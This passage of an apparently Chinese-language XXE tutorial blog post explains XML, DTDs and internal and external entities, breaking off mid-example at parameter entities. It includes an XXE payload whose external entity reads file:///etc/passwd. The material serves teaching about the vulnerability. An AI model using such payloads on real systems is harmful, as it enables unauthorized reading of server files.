{"title":"浅析XML外部实体注入","uid":"ba5cd70ce8afc153bbd78450a1b070ab","slug":"浅析XML实体注入","date":"2022-09-02T02:11:20.000Z","updated":"2023-03-14T07:25:50.000Z","comments":true,"path":"api/articles/浅析XML实体注入.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141525658.png","content":"<h1 id=\"声明\"><a href=\"#声明\" class=\"headerlink\" title=\"声明\"></a>声明</h1><p>文章首发于跳跳糖社区<a href=\"https://tttang.com/archive/1716/\">https://tttang.com/archive/1716/</a></p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>在进行系统学习过后，对XXE进行简单总结，希望能对正在学习XXE的师傅有所帮助</p>\n<h1 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h1><h2 id=\"XML\"><a href=\"#XML\" class=\"headerlink\" title=\"XML\"></a>XML</h2><h3 id=\"什么是XML\"><a href=\"#什么是XML\" class=\"headerlink\" title=\"什么是XML\"></a>什么是XML</h3><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。具体介绍如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签。</p></blockquote>\n<h3 id=\"XML的组成部分\"><a href=\"#XML的组成部分\" class=\"headerlink\" title=\"XML的组成部分\"></a>XML的组成部分</h3><p>XML的文档结构包含以下几种</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">1、XML声明\n//示例: <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span> encoding<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"UTF-8\"</span><span class=\"token delimiter important\">?></span></span>\n2、DTD文档类型定义（可选）:DTD文档类型定义是一套为了进行程序见的数据交换而建立的关于标记符的语法规则\n3、文档元素<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>XML的构建模块模块组成与HTML类似，由下面几种组成</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">元素<span class=\"token punctuation\">:</span><span class=\"token constant\">XML</span>文档的主要构建模块，可包含文本内容\n<span class=\"token comment\">//示例: &lt;username>quan9i&lt;/username></span>\n属性<span class=\"token punctuation\">:</span>提供元素的额外信息\n<span class=\"token comment\">//示例: &lt;img src=\"1.jpg\"/> src就是属性</span>\n实体<span class=\"token punctuation\">:</span>实体是用来定义普通文本的变量。实体引用是对实体的引用。\n<span class=\"token function\">PCDATA</span><span class=\"token punctuation\">(</span>parsed character data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>被解析的字符数据\nps<span class=\"token punctuation\">:</span><span class=\"token constant\">PCDATA</span> 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。\n<span class=\"token function\">CDATA</span><span class=\"token punctuation\">(</span>character data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>字符数据\nps<span class=\"token punctuation\">:</span><span class=\"token constant\">CDATA</span> 是不会被解析器解析的文本。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"XML的作用\"><a href=\"#XML的作用\" class=\"headerlink\" title=\"XML的作用\"></a>XML的作用</h3><p> XML 被设计用来传输和存储数据，其焦点是数据的内容，旨在传输信息。<br> 为什么需要XML呢，引用<code>Qwzf</code>师傅的话</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>现实生活中一些数据之间往往存在一定的关系。我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。</p></blockquote>\n<h3 id=\"XML语法规则\"><a href=\"#XML语法规则\" class=\"headerlink\" title=\"XML语法规则\"></a>XML语法规则</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、所有 <span class=\"token constant\">XML</span> 元素都须有关闭标签。\n<span class=\"token number\">2</span>、<span class=\"token constant\">XML</span> 标签对大小写敏感。\n<span class=\"token number\">3</span>、<span class=\"token constant\">XML</span> 必须正确地嵌套。\n<span class=\"token number\">4</span>、<span class=\"token constant\">XML</span> 文档必须有根元素。\n<span class=\"token number\">5</span>、<span class=\"token constant\">XML</span> 的属性值须加引号。\n<span class=\"token number\">6</span>、实体引用<span class=\"token punctuation\">:</span>在标签属性，以及对应的位置值可能会出现<span class=\"token operator\">&lt;</span><span class=\"token operator\">></span>符号，但是这些符号在对应的<span class=\"token constant\">XML</span>中都是有特殊含义的，这时候我们必须使用对应的<span class=\"token constant\">HTML</span>实体来表示，\n<span class=\"token comment\">//示例:&lt;符号对应的实体就是&amp;lt;</span>\n<span class=\"token number\">7</span>、在<span class=\"token constant\">XML</span>中，空格会被保留\n<span class=\"token comment\">//示例:&lt;p>aa空格bb&lt;/p>，这个空格会被保留</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>举个例子</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span> encoding<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"UTF-8\"</span><span class=\"token delimiter important\">?></span></span> <span class=\"token comment\">&lt;!--xml文件的声明--></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tttang</span><span class=\"token punctuation\">></span></span>                 <span class=\"token comment\">&lt;!--根元素--></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>article</span> <span class=\"token attr-name\">category</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>CTF<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>         <span class=\"token comment\">&lt;!--tttang的子元素，category为属性--></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>XXE<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>               <span class=\"token comment\">&lt;!--article的子元素--></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>author</span><span class=\"token punctuation\">></span></span>quan9i<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>author</span><span class=\"token punctuation\">></span></span>                <span class=\"token comment\">&lt;!--article的子元素--></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>year</span><span class=\"token punctuation\">></span></span>2022<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>year</span><span class=\"token punctuation\">></span></span>                      <span class=\"token comment\">&lt;!--article的子元素--></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>data</span><span class=\"token punctuation\">></span></span>8.20<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>data</span><span class=\"token punctuation\">></span></span>                      <span class=\"token comment\">&lt;!--article的子元素--></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>article</span><span class=\"token punctuation\">></span></span>                             <span class=\"token comment\">&lt;!--article的结束--></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tttang</span><span class=\"token punctuation\">></span></span>                              <span class=\"token comment\">&lt;!--tttang的结束--></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>此时对于XML规则有了一定的认识，我们就可以来了解一下DTD</p>\n<h3 id=\"DTD\"><a href=\"#DTD\" class=\"headerlink\" title=\"DTD\"></a>DTD</h3><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构，约束了xml文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。<br>因为它既可以在内部引用，也可以在外部引用，这就造成了他有三种利用方式:<code>内部引用</code>，<code>外部引用</code>以及<code>内+外引用</code></p>\n<h4 id=\"内部引用\"><a href=\"#内部引用\" class=\"headerlink\" title=\"内部引用\"></a>内部引用</h4><p>格式</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> 根元素<span class=\"token punctuation\">[</span>定义内容<span class=\"token punctuation\">]</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>示例</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span><span class=\"token delimiter important\">?></span></span> <span class=\"token comment\">&lt;!--XML声明 --></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">note</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"> <span class=\"token comment\">&lt;!--定义了note元素--></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">note</span> <span class=\"token attr-name\">(to,from,heading,body)</span><span class=\"token punctuation\">></span></span> <span class=\"token comment\">&lt;!--定义note元素下的四个元素--></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">to</span>      <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">></span></span> <span class=\"token comment\">&lt;!--定义了note的子元素to，(#PCDATA)表示元素to是字符串形式--></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">from</span>    <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">></span></span> <span class=\"token comment\">&lt;!--定义了note的子元素from，(#PCDATA)表示元素from是字符串形式--></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">heading</span> <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">></span></span> <span class=\"token comment\">&lt;!--定义了note的子元素heading，(#PCDATA)表示元素heading是字符串形式--></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">body</span>    <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">></span></span> <span class=\"token comment\">&lt;!--定义了note的子元素body，(#PCDATA)表示元素body是字符串形式--></span>\n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token comment\">&lt;!-- 至此，上方是DTD文档定义--></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>note</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>to</span><span class=\"token punctuation\">></span></span>quan9i<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>to</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>from</span><span class=\"token punctuation\">></span></span>is<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>from</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>heading</span><span class=\"token punctuation\">></span></span>a<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>heading</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>web xiao bai!<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>note</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"外部引用\"><a href=\"#外部引用\" class=\"headerlink\" title=\"外部引用\"></a>外部引用</h4><p>格式</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> 根元素 <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"DTD文件路径\"</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>示例：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">note</span> <span class=\"token name\">SYSTEM</span> <span class=\"token string\">\"note.dtd\"</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>note</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>to</span><span class=\"token punctuation\">></span></span>quan9i<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>to</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>from</span><span class=\"token punctuation\">></span></span>is<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>from</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>heading</span><span class=\"token punctuation\">></span></span>a<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>heading</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>web xiao bai!<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>note</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>note.dtd文件的内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> note <span class=\"token punctuation\">[</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ELEMENT</span> <span class=\"token function\">note</span> <span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">,</span>from<span class=\"token punctuation\">,</span>heading<span class=\"token punctuation\">,</span>body<span class=\"token punctuation\">)</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ELEMENT</span> <span class=\"token function\">to</span>      <span class=\"token punctuation\">(</span><span class=\"token comment\">#PCDATA)>              </span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ELEMENT</span> <span class=\"token function\">from</span>    <span class=\"token punctuation\">(</span><span class=\"token comment\">#PCDATA)></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ELEMENT</span> <span class=\"token function\">heading</span> <span class=\"token punctuation\">(</span><span class=\"token comment\">#PCDATA)></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ELEMENT</span> <span class=\"token function\">body</span>    <span class=\"token punctuation\">(</span><span class=\"token comment\">#PCDATA)></span>\n<span class=\"token punctuation\">]</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"内-外引用\"><a href=\"#内-外引用\" class=\"headerlink\" title=\"内+外引用\"></a>内+外引用</h4><p>格式</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> 根元素 <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"DTD文件路径\"</span> <span class=\"token punctuation\">[</span>定义内容<span class=\"token punctuation\">]</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h4 id=\"DTD实体\"><a href=\"#DTD实体\" class=\"headerlink\" title=\"DTD实体\"></a>DTD实体</h4><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。<br>也就是说，在DTD中的实体类型中，一般分为：内部实体和外部实体。<br>实体细分又分为一般实体和参数实体。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">一般实体：\n定义<span class=\"token punctuation\">:</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> 实体名称 <span class=\"token string double-quoted-string\">\"实体内容\"</span><span class=\"token operator\">></span>\n调用<span class=\"token punctuation\">:</span><span class=\"token operator\">&amp;</span>实体名称<span class=\"token punctuation\">;</span>\n\n参数实体<span class=\"token punctuation\">:</span>\n定义<span class=\"token punctuation\">:</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> 实体名 \"实体内容”<span class=\"token operator\">></span>\n调用<span class=\"token punctuation\">:</span><span class=\"token operator\">%</span>实体名称<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"内部实体\"><a href=\"#内部实体\" class=\"headerlink\" title=\"内部实体\"></a>内部实体</h5><p>格式</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> 实体名称 <span class=\"token string double-quoted-string\">\"实体的值\"</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>示例</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">test</span><span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">article</span> <span class=\"token attr-name\">\"XXE\"</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">author</span> <span class=\"token attr-name\">\"quan9i\"</span><span class=\"token punctuation\">></span></span>\n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>test</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>article</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&article;\">&amp;article;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>article</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>author</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&author;\">&amp;author;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>author</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>test</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h5 id=\"外部实体\"><a href=\"#外部实体\" class=\"headerlink\" title=\"外部实体\"></a>外部实体</h5><p>格式</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> 实体名称 <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"URI/URL\"</span><span class=\"token operator\">></span>\n或者\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> 实体名称 <span class=\"token keyword\">PUBLIC</span> <span class=\"token string double-quoted-string\">\"public_ID\"</span> <span class=\"token string double-quoted-string\">\"URI\"</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>示例</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">test</span><span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">author</span> <span class=\"token attr-name\">SYSTEM</span> <span class=\"token attr-name\">\"quan9i.xml\"</span><span class=\"token punctuation\">></span></span>\n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>test</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&author;\">&amp;author;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>test</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>外部实体同时还支持http等协议，具体如下图<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153165.png\" alt=\"在这里插入图片描述\"><br>这里的话再举个例子</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1.0\"</span> encoding <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"utf-8\"</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">test</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n    &lt;!ENTITY file SYSTEM \"file:///etc/passwd\">\n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>test</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&file;\">&amp;file;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>test</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>同时由于实体又分两种，这里的话再给出一个例子了解一下参数实体<br>示例</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version<span 